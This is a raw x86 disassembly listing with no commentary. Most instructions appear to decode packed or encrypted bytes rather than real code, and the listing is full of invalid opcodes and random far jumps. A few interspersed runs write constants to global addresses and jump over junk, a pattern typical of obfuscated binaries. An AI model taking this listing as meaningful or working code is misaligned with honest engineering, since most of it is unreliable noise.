  40d584:	lea    ecx,[edx+edx*2-0x1d81f1a]
  40d58b:	or     DWORD PTR [edi],esi
  40d58d:	jo     0x40d564
  40d58f:	pusha  
  40d590:	pop    edi
  40d591:	inc    ebx
  40d592:	pop    ebp
  40d593:	pop    ss
  40d594:	add    eax,0xf832bd5d
  40d599:	div    BYTE PTR [esp+ecx*2]
  40d59c:	xchg   ebx,eax
  40d59d:	cmp    BYTE PTR [esi-0x27],ah
  40d5a0:	dec    edi
  40d5a1:	lea    eax,[edi-0xbb4d324]
  40d5a7:	shl    DWORD PTR [edi+ebx*4-0x5b],cl
  40d5ab:	inc    edi
  40d5ac:	arpl   WORD PTR [esi-0x1b59bf5f],cx
  40d5b2:	loope  0x40d5df
  40d5b4:	dec    ebx
  40d5b5:	jne    0x40d5f5
  40d5b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5b8:	inc    esi
  40d5b9:	inc    edi
  40d5ba:	ss nop
  40d5bc:	in     eax,dx
  40d5bd:	sbb    DWORD PTR [edx],edi
  40d5bf:	push   ebx
  40d5c0:	jae    0x40d592
  40d5c2:	jp     0x40d575
  40d5c4:	int    0xf9
  40d5c6:	mov    eax,0xa3615463
  40d5cb:	mov    dl,0x44
  40d5cd:	int    0xe2
  40d5cf:	out    dx,eax
  40d5d0:	or     edx,DWORD PTR [edx-0x17]
  40d5d3:	outs   dx,DWORD PTR ds:[esi]
  40d5d4:	fisttp DWORD PTR [ecx+0x47]
  40d5d7:	xor    BYTE PTR [ebx+0x7e],al
  40d5da:	jl     0x40d5df
  40d5dc:	cmp    eax,0xd9376d1c
  40d5e1:	or     BYTE PTR [edx+0x1735174e],ah
  40d5e7:	ret    0x9c9b
  40d5ea:	into   
  40d5eb:	sbb    DWORD PTR [eax-0x15],ebp
  40d5ee:	sbb    eax,0xe419cd92
  40d5f3:	dec    edx
  40d5f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5f5:	scas   eax,DWORD PTR es:[edi]
  40d5f6:	sbb    BYTE PTR [ecx+ebp*4+0x28],al
  40d5fa:	imul   esp,DWORD PTR [edx+ecx*4+0x45],0xe5e8698d
  40d602:	dec    ebx
  40d603:	aam    0x1c
  40d605:	repnz scas al,BYTE PTR es:[edi]
  40d607:	ss ins DWORD PTR es:[edi],dx
  40d609:	cmp    esp,DWORD PTR [bp+si+0x16]
  40d60d:	xchg   DWORD PTR [edi+0x74],edx
  40d610:	es push eax
  40d612:	(bad)  
  40d613:	and    ebx,DWORD PTR [edi-0x3b43f6c3]
  40d619:	outs   dx,BYTE PTR ds:[esi]
  40d61a:	imul   esp,DWORD PTR [esi],0xa3900930
  40d620:	(bad)  
  40d621:	sub    eax,DWORD PTR [edx]
  40d623:	hlt    
  40d624:	mov    BYTE PTR [ebp-0x5a],0x3c
  40d628:	jle    0x40d5b2
  40d62a:	mov    BYTE PTR [ebp+0x5949960f],ch
  40d630:	lahf   
  40d631:	loopne 0x40d60b
  40d633:	and    BYTE PTR [eax-0x1c666a79],ah
  40d639:	retf   0x1cab
  40d63c:	(bad)  
  40d63d:	pop    ebp
  40d63e:	and    eax,0x4101221e
  40d643:	or     BYTE PTR [edi],ch
  40d645:	and    DWORD PTR [esi],ecx
  40d647:	mov    ebx,0x6d738cdd
  40d64c:	repz and esi,edx
  40d64f:	(bad)  
  40d650:	iret   
  40d651:	xchg   esi,eax
  40d652:	fs mov al,0x91
  40d655:	aam    0xea
  40d657:	das    
  40d658:	pop    eax
  40d659:	add    esp,DWORD PTR [edi]
  40d65b:	lahf   
  40d65c:	ins    DWORD PTR es:[edi],dx
  40d65d:	adc    al,0x55
  40d65f:	xchg   esi,eax
  40d660:	jp     0x40d611
  40d662:	push   esp
  40d663:	xchg   esi,eax
  40d664:	inc    eax
  40d665:	retf   
  40d666:	repz mov eax,0x6501259b
  40d66c:	hlt    
  40d66d:	jae    0x40d6dd
  40d66f:	xlat   BYTE PTR ds:[ebx]
  40d670:	fidiv  WORD PTR [esi-0x61]
  40d673:	stos   DWORD PTR es:[edi],eax
  40d674:	pop    esi
  40d675:	xor    BYTE PTR fs:[ebp+ebx*4+0x5f36cfab],bh
  40d67d:	in     al,dx
  40d67e:	mov    cl,0x9
  40d680:	mov    DWORD PTR [ecx+ebp*8+0x2a1d8c13],esi
  40d687:	cdq    
  40d688:	icebp  
  40d689:	(bad)  
  40d68a:	jae    0x40d6a8
  40d68c:	arpl   WORD PTR [ebx-0x19],bp
  40d68f:	fisttp WORD PTR [ebx+0x78]
  40d692:	pushf  
  40d693:	cld    
  40d694:	push   0xf94f3254
  40d699:	inc    esi
  40d69a:	add    eax,0x7db2f573
  40d69f:	retf   0xdd52
  40d6a2:	cmp    bl,dh
  40d6a4:	dec    edi
  40d6a5:	dec    ebx
  40d6a6:	add    edi,DWORD PTR [ebp-0x10]
  40d6a9:	adc    DWORD PTR [esi-0x4b1701e9],edi
  40d6af:	call   0xc931:0x828e4181
  40d6b6:	xchg   ebx,eax
  40d6b7:	jb     0x40d6c3
  40d6b9:	shr    BYTE PTR [esi+0x1d181a6a],1
  40d6bf:	out    dx,eax
  40d6c0:	ret    
  40d6c1:	stos   DWORD PTR es:[edi],eax
  40d6c2:	(bad)  
  40d6c3:	adc    edx,esi
  40d6c5:	sbb    edi,DWORD PTR [eax+0x3d]
  40d6c8:	push   esi
  40d6c9:	or     eax,0xb9dd407e
  40d6ce:	cmp    al,0x8a
  40d6d0:	mov    ecx,0xbdb714a7
  40d6d5:	mov    ds:0x7dc64452,al
  40d6da:	movq   mm0,QWORD PTR [ebx-0x43c9cc79]
  40d6e1:	and    al,0x89
  40d6e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6e4:	sbb    bh,bh
  40d6e6:	or     esi,DWORD PTR [ecx-0x229b29c9]
  40d6ec:	sbb    ch,ah
  40d6ee:	int3   
  40d6ef:	int3   
  40d6f0:	jae    0x40d74c
  40d6f2:	int    0x33
  40d6f4:	in     eax,0x6b
  40d6f6:	popa   
  40d6f7:	(bad)  
  40d6f8:	jnp    0x40d69d
  40d6fa:	aas    
  40d6fb:	sti    
  40d6fc:	std    
  40d6fd:	arpl   WORD PTR [edi],di
  40d6ff:	cmp    DWORD PTR [ebx-0x13],eax
  40d702:	cmp    al,0xb7
  40d704:	scas   al,BYTE PTR es:[edi]
  40d705:	or     ah,cl
  40d707:	and    al,0xed
  40d709:	or     cl,BYTE PTR [edx]
  40d70b:	mov    ch,0x65
  40d70d:	ds push esp
  40d70f:	mov    edi,0xa938890d
  40d714:	xchg   edx,eax
  40d715:	fstp   DWORD PTR [eax+ebx*2+0x26]
  40d719:	push   edi
  40d71a:	lahf   
  40d71b:	push   cs
  40d71c:	or     eax,0xe4017dd4
  40d721:	ret    0x26ba
  40d724:	cmp    esi,DWORD PTR [eax]
  40d726:	adc    eax,0xda4ce9de
  40d72b:	fimul  DWORD PTR [ebx]
  40d72d:	push   esp
  40d72e:	jbe    0x40d6c3
  40d730:	aaa    
  40d731:	sbb    dl,dl
  40d733:	aam    0xa1
  40d735:	dec    esi
  40d736:	js     0x40d796
  40d738:	xchg   ecx,eax
  40d739:	out    0x91,al
  40d73b:	mov    ds:0xc7a4feff,al
  40d740:	(bad)  
  40d742:	jmp    0x6c2f:0x916285af
  40d749:	sub    ecx,DWORD PTR [ebx-0x43]
  40d74c:	adc    ebp,edx
  40d74e:	add    DWORD PTR [eax-0x6e],eax
  40d751:	push   0xf534d47e
  40d756:	lods   eax,DWORD PTR ds:[esi]
  40d757:	aaa    
  40d758:	mov    ebp,0xc461e0ab
  40d75d:	push   edi
  40d75e:	cs adc al,0x97
  40d761:	ror    BYTE PTR [ebp-0x5a],1
  40d764:	push   esp
  40d765:	call   0x8c00b359
  40d76a:	out    0xea,eax
  40d76c:	clc    
  40d76d:	cmp    eax,0xd8246348
  40d772:	lods   al,BYTE PTR ds:[esi]
  40d773:	xor    cl,0x1c
  40d776:	outs   dx,DWORD PTR ds:[esi]
  40d777:	retf   0xb305
  40d77a:	mov    BYTE PTR [edx-0x32],dh
  40d77d:	int    0x2f
  40d77f:	xor    al,0x9b
  40d781:	out    dx,eax
  40d782:	cmp    DWORD PTR [esi-0xe],0x7f5c605
  40d789:	daa    
  40d78a:	scas   eax,DWORD PTR es:[edi]
  40d78b:	adc    eax,0x8118f9d4
  40d790:	sub    al,0x60
  40d792:	out    dx,eax
  40d793:	hlt    
  40d794:	js     0x40d726
  40d796:	loopne 0x40d71b
  40d798:	jle    0x40d720
  40d79a:	int3   
  40d79b:	outs   dx,BYTE PTR ds:[esi]
  40d79c:	push   ds
  40d79d:	cmp    DWORD PTR [ecx],edi
  40d79f:	lea    edi,[esi+0x47]
  40d7a2:	lods   al,BYTE PTR ds:[esi]
  40d7a3:	leave  
  40d7a4:	xchg   ebx,eax
  40d7a5:	jbe    0x40d77d
  40d7a7:	pop    ebp
  40d7a8:	sti    
  40d7a9:	and    al,0xa5
  40d7ab:	mov    ch,0x64
  40d7ad:	jecxz  0x40d80b
  40d7af:	dec    ebp
  40d7b0:	adc    al,0xe
  40d7b2:	lock xchg ecx,eax
  40d7b4:	out    dx,eax
  40d7b5:	mov    esp,0x65b87191
  40d7ba:	loop   0x40d75d
  40d7bc:	cmp    edi,0x33c
  40d7c2:	mov    DWORD PTR ds:0x42a7bd,0x14bd
  40d7cc:	jne    0x40dd11
  40d7d2:	and    eax,DWORD PTR ds:0x42a7c5
  40d7d8:	jmp    0x40da30
  40d7dd:	int    0xca
  40d7df:	(bad)  
  40d7e0:	into   
  40d7e1:	(bad)  
  40d7e3:	aad    0xc9
  40d7e5:	lea    edi,[esi-0x59701ba3]
  40d7eb:	fisttp QWORD PTR [eax+0x59]
  40d7ee:	test   eax,0x7e357878
  40d7f3:	js     0x40d86d
  40d7f5:	push   cs
  40d7f6:	push   ebx
  40d7f7:	push   esi
  40d7f8:	iret   
  40d7f9:	or     DWORD PTR [edx+0x53],esi
  40d7fc:	add    esp,DWORD PTR [esi-0x56]
  40d7ff:	inc    ecx
  40d800:	into   
  40d801:	push   eax
  40d802:	inc    edx
  40d803:	call   0x5d27:0xf8e715c8
  40d80a:	sub    DWORD PTR [ecx+0xfebdd33],edx
  40d810:	out    dx,eax
  40d811:	push   0x18
  40d813:	sbb    DWORD PTR [ebx-0x6d],edx
  40d816:	or     BYTE PTR [ebx+0x15],0x7d
  40d81a:	je     0x40d7d9
  40d81c:	xor    edi,DWORD PTR [esi-0x74d5fd]
  40d822:	pop    eax
  40d823:	jmp    0x85cb:0xd65ffe1e
  40d82a:	push   ecx
  40d82b:	repnz mov ebp,0x6eccfcdc
  40d831:	sbb    DWORD PTR [esi],edi
  40d833:	jbe    0x40d855
  40d835:	(bad)  
  40d836:	push   edx
  40d837:	aam    0xb3
  40d839:	pop    eax
  40d83a:	and    ecx,DWORD PTR [ecx-0x322972ca]
  40d840:	lds    ecx,FWORD PTR [ecx+ebp*4]
  40d843:	arpl   WORD PTR [eax],bp
  40d845:	cmp    dh,BYTE PTR [esi+0x45]
  40d848:	mov    edi,0x99881c30
  40d84d:	mov    eax,0x75a30ea
  40d852:	aad    0x76
  40d854:	jb     0x40d810
  40d856:	sub    bh,BYTE PTR [edx]
  40d858:	aas    
  40d859:	icebp  
  40d85a:	int3   
  40d85b:	out    0xd8,eax
  40d85d:	je     0x40d846
  40d85f:	loop   0x40d855
  40d861:	add    eax,0xdd901c0c
  40d866:	and    eax,0xcbc5cd3e
  40d86b:	ds imul ebp,ecx,0x12
  40d86f:	xchg   ebp,eax
  40d870:	stc    
  40d871:	rol    DWORD PTR [ecx-0xc9620dd],0xdc
  40d878:	mov    cl,0x29
  40d87a:	inc    edi
  40d87b:	mov    bh,0x38
  40d87d:	(bad)  [eax+ecx*2-0x47189608]
  40d884:	leave  
  40d885:	nop
  40d886:	ds nop
  40d888:	sbb    al,0x49
  40d88a:	mov    ds:0x8abb9b3f,al
  40d88f:	dec    edx
  40d890:	xchg   esi,eax
  40d891:	sbb    BYTE PTR ds:0xead0b4cf,0xb3
  40d898:	jns    0x40d83d
  40d89a:	push   ecx
  40d89b:	arpl   bp,ax
  40d89d:	cmp    al,0x87
  40d89f:	push   edi
  40d8a0:	fldcw  WORD PTR [ecx-0x7b]
  40d8a3:	lea    esp,[edi+eiz*2-0x26afb7e8]
  40d8aa:	add    bl,BYTE PTR [ebp+0x17]
  40d8ad:	mov    eax,0x59f83c3b
  40d8b2:	add    BYTE PTR [eax+0x5df3aaad],al
  40d8b8:	mov    dl,0x5c
  40d8ba:	(bad)  
  40d8bb:	mov    BYTE PTR [esp+esi*2+0x869054b],ch
  40d8c2:	jp     0x40d894
  40d8c4:	adc    al,0x77
  40d8c6:	adc    al,0x9d
  40d8c8:	loopne 0x40d87f
  40d8ca:	or     DWORD PTR [eax+ebx*2-0x4d],edx
  40d8ce:	mov    WORD PTR [ebp+esi*4-0x43e88236],?
  40d8d5:	add    DWORD PTR [edi+0x6e9f7e7f],eax
  40d8db:	and    eax,0x62c48381
  40d8e0:	mov    DWORD PTR ds:0xf65214ec,edx
  40d8e6:	call   DWORD PTR [ebp+0x53]
  40d8e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8ea:	pusha  
  40d8eb:	retf   0xa1e9
  40d8ee:	addr16 das 
  40d8f0:	xchg   ebx,eax
  40d8f1:	sub    bh,BYTE PTR [edi+0x161e4128]
  40d8f7:	push   eax
  40d8f8:	nop
  40d8f9:	jge    0x40d961
  40d8fb:	neg    BYTE PTR [edx]
  40d8fd:	dec    ebx
  40d8fe:	gs jle 0x40d95f
  40d901:	xor    ah,0xcb
  40d904:	test   al,0x6a
  40d906:	into   
  40d907:	outs   dx,DWORD PTR ds:[esi]
  40d908:	shl    BYTE PTR [ebx],0x1b
  40d90b:	xchg   ebx,eax
  40d90c:	gs dec ebx
  40d90e:	jne    0x40d910
  40d910:	pop    edx
  40d911:	repnz lahf 
  40d913:	int    0x43
  40d915:	mov    esp,0xdb755468
  40d91a:	mov    esp,0xf47ba36a
  40d91f:	sbb    BYTE PTR [ebx+0x2a881f8],cl
  40d925:	sub    eax,0x482937c9
  40d92a:	sbb    al,0xe
  40d92c:	int    0xbe
  40d92e:	mov    eax,ds:0xb40bcdbf
  40d933:	jnp    0x40d90d
  40d935:	fisub  WORD PTR [edx+0x719c0f6d]
  40d93b:	(bad)  
  40d93d:	xchg   edi,eax
  40d93e:	jp     0x40d8d6
  40d940:	push   ebp
  40d941:	jmp    0x3838:0x65a4291f
  40d948:	cwde   
  40d949:	mov    BYTE PTR [ebx-0x44],dl
  40d94c:	fcmovb st,st(4)
  40d94e:	xchg   ebx,eax
  40d94f:	sahf   
  40d950:	mov    WORD PTR [ecx],?
  40d952:	pop    ds
  40d953:	and    eax,DWORD PTR [esi+ebp*8+0x36]
  40d957:	je     0x40d977
  40d959:	jmp    0x40d975
  40d95b:	int    0x44
  40d95d:	out    dx,eax
  40d95e:	adc    cl,bl
  40d960:	sub    ebx,DWORD PTR [esi-0x20bff55c]
  40d966:	ss fs (bad) 
  40d969:	neg    DWORD PTR [eax-0x31]
  40d96c:	mul    BYTE PTR [ebx+0x21ba0804]
  40d972:	ret    
  40d973:	pop    bp
  40d975:	sbb    cl,cl
  40d977:	adc    eax,0xc9c1cfcb
  40d97c:	dec    eax
  40d97d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d97e:	ss js  0x40d9c2
  40d981:	sub    BYTE PTR [esi+0x56],0x92
  40d985:	jg     0x40d98c
  40d987:	in     al,dx
  40d988:	int3   
  40d989:	sbb    dh,dl
  40d98b:	mov    bh,0x21
  40d98d:	add    bh,dh
  40d98f:	add    al,0xa3
  40d991:	jmp    0xccaefab7
  40d996:	(bad)  [eax+eiz*2+0x49]
  40d99a:	add    BYTE PTR [esi],0xeb
  40d99d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d99e:	jl     0x40da07
  40d9a0:	or     al,0x43
  40d9a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9a3:	nop
  40d9a4:	xchg   ecx,eax
  40d9a5:	jl     0x40d9cf
  40d9a7:	add    dl,BYTE PTR [ebp+0x74b06b1c]
  40d9ad:	pop    ebx
  40d9ae:	out    dx,eax
  40d9af:	pop    DWORD PTR [eax]
  40d9b1:	jbe    0x40d94c
  40d9b3:	pop    eax
  40d9b4:	int3   
  40d9b5:	fcmovbe st,st(5)
  40d9b7:	jne    0x40d9f8
  40d9b9:	pop    edx
  40d9ba:	dec    edi
  40d9bb:	mov    al,ds:0xe8a5ede3
  40d9c0:	mov    al,ds:0x3bbdfc91
  40d9c5:	pop    esp
  40d9c6:	loope  0x40d9a8
  40d9c8:	jle    0x40d9e3
  40d9ca:	out    dx,eax
  40d9cb:	mov    bl,dl
  40d9cd:	call   0x4457cdc6
  40d9d2:	and    bh,BYTE PTR [esi+0x1f9484b2]
  40d9d8:	xchg   DWORD PTR [ecx-0x49],esi
  40d9db:	push   edx
  40d9dc:	add    bl,BYTE PTR [ebx+0x42]
  40d9df:	jl     0x40d97a
  40d9e1:	or     edi,DWORD PTR [ebp-0x7409b949]
  40d9e7:	int3   
  40d9e8:	xor    esi,ebx
  40d9ea:	lods   al,BYTE PTR ds:[esi]
  40d9eb:	sbb    ebx,0xdf996c94
  40d9f1:	xor    edx,ebp
  40d9f3:	jne    0x40d9d2
  40d9f5:	aaa    
  40d9f6:	xor    al,0x7d
  40d9f8:	sbb    ecx,DWORD PTR cs:[edi-0x7ae9a4b4]
  40d9ff:	push   cs
  40da00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da01:	pop    es
  40da02:	pop    esi
  40da03:	imul   ebp,DWORD PTR [edi],0xe5f871e8
  40da09:	pop    es
  40da0a:	jne    0x40da72
  40da0c:	xchg   BYTE PTR [eax-0x64],bl
  40da0f:	in     eax,0xa1
  40da11:	ds call 0x4eb1bfb0
  40da17:	pushf  
  40da18:	(bad)  
  40da19:	jge    0x40da8f
  40da1b:	test   al,0x65
  40da1d:	mov    cs,WORD PTR [ebx-0x4b]
  40da20:	xor    ch,BYTE PTR [edi]
  40da22:	pop    ebx
  40da23:	lea    edi,[ebp-0x3a]
  40da26:	add    al,cl
  40da28:	outs   dx,BYTE PTR ds:[esi]
  40da29:	outs   dx,DWORD PTR ds:[esi]
  40da2a:	ins    DWORD PTR es:[edi],dx
  40da2b:	xor    edx,esi
  40da2d:	xchg   ebp,eax
  40da2e:	loope  0x40d9cb
  40da30:	and    DWORD PTR [ebp+0x8],0x0
  40da34:	mov    eax,ds:0x42a831
  40da39:	sbb    eax,DWORD PTR ds:0x42a809
  40da3f:	mov    ds:0x42a831,eax
  40da44:	mov    eax,DWORD PTR [ebp-0x8]
  40da47:	xor    DWORD PTR ds:0x42a7f1,0x42a7bd
  40da51:	sub    eax,DWORD PTR [ebp+0x8]
  40da54:	or     DWORD PTR ds:0x42a801,0xc38
  40da5e:	push   eax
  40da5f:	adc    DWORD PTR ds:0x42a771,0x6147
  40da69:	mov    eax,DWORD PTR [ebp-0x4]
  40da6c:	jmp    0x40dcc4
  40da71:	enter  0xc6c0,0x3c
  40da75:	(bad)  
  40da76:	ret    0xd4da
  40da79:	push   cs
  40da7a:	in     al,dx
  40da7b:	pop    edi
  40da7c:	dec    esi
  40da7d:	arpl   WORD PTR [eax+0x19],si
  40da80:	fist   DWORD PTR [esi]
  40da82:	scas   al,BYTE PTR es:[edi]
  40da83:	js     0x40dafd
  40da85:	xor    eax,0xa978787e
  40da8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da8b:	in     eax,dx
  40da8c:	lock mov ecx,0x17aaecb6
  40da92:	xor    BYTE PTR [eax+0x58],ah
  40da95:	out    dx,al
  40da96:	daa    
  40da97:	inc    DWORD PTR [ebx]
  40da99:	pop    ds
  40da9a:	xor    eax,0x4da1ce58
  40da9f:	cdq    
  40daa0:	fs pop ebp
  40daa2:	jp     0x40da46
  40daa4:	dec    edi
  40daa5:	mov    bl,0x92
  40daa7:	fisttp QWORD PTR [ebx]
  40daa9:	xchg   edi,eax
  40daaa:	outs   dx,BYTE PTR ds:[esi]
  40daab:	mov    al,0xd4
  40daad:	fdivr  QWORD PTR [ecx]
  40daaf:	mov    ch,0x8b
  40dab1:	jg     0x40dab2
  40dab3:	adc    ebp,DWORD PTR [edi+0x0]
  40dab6:	lahf   
  40dab7:	imul   esi,ebp,0x7ade2d45
  40dabd:	mov    ds:0x933e29a6,al
  40dac2:	push   0xeda69278
  40dac7:	lock xchg ecx,eax
  40dac9:	shl    BYTE PTR [edx-0x55d0c03a],cl
  40dacf:	jle    0x40dafe
  40dad1:	adc    ebx,DWORD PTR [esi-0x21]
  40dad4:	adc    ebp,DWORD PTR [ecx-0x4790022c]
  40dada:	cmp    edx,DWORD PTR [eax+edx*4+0x3246585e]
  40dae1:	dec    edx
  40dae2:	ss xchg ecx,eax
  40dae4:	fs mov dl,0x2b
  40dae7:	fidiv  DWORD PTR [esi-0x6bd77c32]
  40daed:	dec    edx
  40daee:	pop    eax
  40daef:	jns    0x40daa3
  40daf1:	shr    dh,cl
  40daf3:	cmc    
  40daf4:	gs iret 
  40daf6:	jo     0x40da7c
  40daf8:	sub    edx,edi
  40dafa:	mov    edx,tr5
  40dafd:	jno    0x40dab0
  40daff:	fild   QWORD PTR [esi]
  40db01:	imul   DWORD PTR [edi+0x5b]
  40db04:	or     ebx,DWORD PTR ds:0x5675b196
  40db0a:	mov    edi,0xeaf298ef
  40db0f:	retf   0x17c8
  40db12:	sar    DWORD PTR [eax],0x5
  40db15:	add    bh,al
  40db17:	inc    edi
  40db18:	pushf  
  40db19:	mov    ah,0xb1
  40db1b:	rcl    ah,cl
  40db1d:	clc    
  40db1e:	daa    
  40db1f:	mov    esi,0xd7e5720d
  40db24:	inc    ebx
  40db25:	mov    ebx,0xa19d87f1
  40db2a:	push   es
  40db2b:	mov    edx,0xf938fb9
  40db30:	and    esp,ebp
  40db32:	pop    ecx
  40db33:	or     al,0x2e
  40db35:	sub    al,BYTE PTR [esi+0x9272cab]
  40db3b:	(bad)  
  40db3c:	stc    
  40db3d:	xor    al,0x98
  40db3f:	pop    ds
  40db40:	neg    cl
  40db42:	and    cl,BYTE PTR [ebx+0x75]
  40db45:	fwait
  40db46:	stos   DWORD PTR es:[edi],eax
  40db47:	sub    esp,DWORD PTR [esi]
  40db49:	ins    BYTE PTR es:[edi],dx
  40db4a:	(bad)  
  40db4c:	pop    esi
  40db4d:	ret    
  40db4e:	aaa    
  40db4f:	aaa    
  40db50:	or     al,0x3d
  40db52:	dec    esi
  40db53:	xor    DWORD PTR ds:0x449345d0,esi
  40db59:	push   esi
  40db5a:	mov    dl,0x33
  40db5c:	xor    esp,DWORD PTR [ebx+0xfb0faa9]
  40db62:	in     eax,0xea
  40db64:	in     al,dx
  40db65:	adc    al,0xd7
  40db67:	(bad)  
  40db68:	mov    edi,0xf96a9c53
  40db6d:	sbb    eax,0x7820feaf
  40db72:	pusha  
  40db73:	scas   al,BYTE PTR es:[edi]
  40db74:	call   0x22dd2ab8
  40db79:	sub    al,0xc5
  40db7b:	jmp    FWORD PTR [si]
  40db7e:	scas   eax,DWORD PTR es:[edi]
  40db7f:	out    dx,eax
  40db80:	(bad)  
  40db81:	push   ds
  40db82:	fisttp DWORD PTR [ebx+0x64]
  40db85:	jne    0x40dbbb
  40db87:	xchg   edi,eax
  40db88:	mov    WORD PTR [edx-0x3a2fce64],es
  40db8e:	in     al,0xc0
  40db90:	cmp    BYTE PTR [edx+0x71],bh
  40db93:	cli    
  40db94:	ret    
  40db95:	add    dh,ch
  40db97:	(bad)  
  40db98:	mov    DWORD PTR [esp+edx*2],esi
  40db9b:	mov    ebp,0xf963d4a9
  40dba0:	mov    dl,0xc5
  40dba2:	mov    cl,0x44
  40dba4:	les    ebx,FWORD PTR [eax-0x7e13f573]
  40dbaa:	sar    BYTE PTR [ecx-0x657d8b6a],0xe4
  40dbb1:	xor    eax,eax
  40dbb3:	xchg   edi,eax
  40dbb4:	fimul  WORD PTR [ebp+0x37f26279]
  40dbba:	or     dh,BYTE PTR [edx+eiz*2-0x5a]
  40dbbe:	jg     0x40db74
  40dbc0:	sar    BYTE PTR [ebp+edi*8+0x47],0x26
  40dbc5:	mov    ds:0x5308272f,al
  40dbca:	or     DWORD PTR [ecx+0x1f50d2e8],ebp
  40dbd0:	call   0x21f4:0xe743c36b
  40dbd7:	(bad)  [esi-0x76517474]
  40dbdd:	inc    ebx
  40dbde:	mov    edi,gs
  40dbe0:	fs into 
  40dbe2:	arpl   WORD PTR [edx-0x12],bx
  40dbe5:	repz fsubr QWORD PTR [edx+0x435947f2]
  40dbec:	test   BYTE PTR [edi-0x43],al
  40dbef:	fidiv  DWORD PTR [ebp-0x60]
  40dbf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbf3:	pop    ss
  40dbf4:	pmulhw mm4,QWORD PTR ds:0xb657565c
  40dbfb:	rcr    BYTE PTR [ebp-0x54],0xdb
  40dbff:	sub    eax,0x52c26034
  40dc04:	dec    ecx
  40dc05:	sbb    DWORD PTR [ebp-0x21522911],ebp
  40dc0b:	push   ecx
  40dc0c:	leave  
  40dc0d:	sub    DWORD PTR [esi+0x6f108c69],eax
  40dc13:	adc    DWORD PTR [edx-0x66b93f7d],ebx
  40dc19:	mov    bl,0xf2
  40dc1b:	dec    eax
  40dc1c:	fmul   QWORD PTR [eax]
  40dc1e:	sub    eax,0x529e2cb3
  40dc23:	jg     0x40dc64
  40dc25:	test   BYTE PTR [esi],0x77
  40dc28:	mov    ds:0xfd68c253,al
  40dc2d:	jl     0x40dbd6
  40dc2f:	int3   
  40dc30:	arpl   WORD PTR [ecx+0x33378f01],sp
  40dc36:	scas   eax,DWORD PTR es:[edi]
  40dc37:	fmul   QWORD PTR [edx-0x42]
  40dc3a:	scas   al,BYTE PTR es:[edi]
  40dc3b:	stc    
  40dc3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc3d:	xor    ah,BYTE PTR [ecx+0x5780ffd8]
  40dc43:	clc    
  40dc44:	cmp    ch,ah
  40dc46:	call   0x53e09ee8
  40dc4b:	lds    ebp,FWORD PTR [eax-0x70]
  40dc4e:	and    al,0x7e
  40dc50:	dec    edx
  40dc51:	lahf   
  40dc52:	fisub  DWORD PTR [ecx]
  40dc54:	push   ds
  40dc55:	ret    
  40dc56:	loopne 0x40dcb0
  40dc58:	mov    bh,0xfe
  40dc5a:	xor    al,BYTE PTR [ecx]
  40dc5c:	mov    ebx,0xd7ca234
  40dc61:	idiv   DWORD PTR [eax-0x683fb86e]
  40dc67:	stc    
  40dc68:	cmp    al,0x7e
  40dc6b:	fidiv  WORD PTR [ecx]
  40dc6d:	pop    edi
  40dc6e:	xchg   esi,eax
  40dc6f:	(bad)  
  40dc70:	mov    bh,0x64
  40dc72:	mov    ebp,0x30482308
  40dc77:	mov    bl,0x21
  40dc79:	mov    esp,ecx
  40dc7b:	je     0x40dc93
  40dc7d:	iret   
  40dc7e:	cmp    esi,edi
  40dc80:	mov    ah,0xa
  40dc82:	out    0x47,al
  40dc84:	mov    dl,0x54
  40dc86:	xchg   edx,eax
  40dc87:	mov    BYTE PTR [ecx-0x3a],dh
  40dc8a:	sar    ch,1
  40dc8c:	leave  
  40dc8d:	jl     0x40dced
  40dc8f:	inc    edx
  40dc90:	inc    ecx
  40dc91:	pop    es
  40dc92:	scas   eax,DWORD PTR es:[edi]
  40dc93:	inc    ebx
  40dc94:	jmp    0x40dc38
  40dc96:	into   
  40dc97:	inc    esp
  40dc98:	mov    bl,0xa1
  40dc9a:	(bad)  
  40dc9b:	mov    ds:0x2b3f8c6c,eax
  40dca0:	mov    ds:0x91a7f5ea,eax
  40dca5:	mov    esi,0x6c6f4df0
  40dcaa:	push   ebp
  40dcab:	sti    
  40dcac:	mov    cl,0x68
  40dcae:	jno    0x40dd2a
  40dcb0:	xor    BYTE PTR [ecx-0xd5c68d5],ah
  40dcb6:	out    0x3,eax
  40dcb8:	test   DWORD PTR ds:0xa1de90bd,ecx
  40dcbe:	jo     0x40dca2
  40dcc0:	add    ah,BYTE PTR [ecx]
  40dcc2:	xlat   BYTE PTR ds:[ebx]
  40dcc3:	pop    DWORD PTR [ebx]
  40dcc5:	inc    ebp
  40dcc6:	or     BYTE PTR [ecx+0x42a88105],al
  40dccc:	add    BYTE PTR [edx+0x29],ch
  40dccf:	add    BYTE PTR [eax],al
  40dcd1:	push   eax
  40dcd2:	adc    DWORD PTR ds:0x42a75d,0x7658
  40dcdc:	call   0x40e99f
  40dce1:	mov    DWORD PTR ds:0x42a7b5,0x7bae
  40dceb:	inc    DWORD PTR [ebp+0x8]
  40dcee:	cmp    DWORD PTR [ebp+0x8],0x52
  40dcf2:	mov    DWORD PTR ds:0x42a831,0x71fa
  40dcfc:	jb     0x40da34
  40dd02:	mov    DWORD PTR ds:0x42a83d,0x568b
  40dd0c:	jmp    0x40e979
  40dd11:	cmp    edi,0x1a2
  40dd17:	jne    0x40e497
  40dd1d:	sbb    DWORD PTR ds:0x42a7b9,edx
  40dd23:	mov    DWORD PTR [ebp-0x60],0xf89c853c
  40dd2a:	mov    eax,DWORD PTR [ebp-0x4]
  40dd2d:	mov    DWORD PTR [ebp-0x5c],eax
  40dd30:	mov    eax,DWORD PTR [ebp-0x8]
  40dd33:	mov    DWORD PTR [ebp-0x58],eax
  40dd36:	movzx  eax,WORD PTR ds:0x42a7b1
  40dd3d:	and    DWORD PTR ds:0x42a781,eax
  40dd43:	mov    eax,DWORD PTR [ebp-0xc]
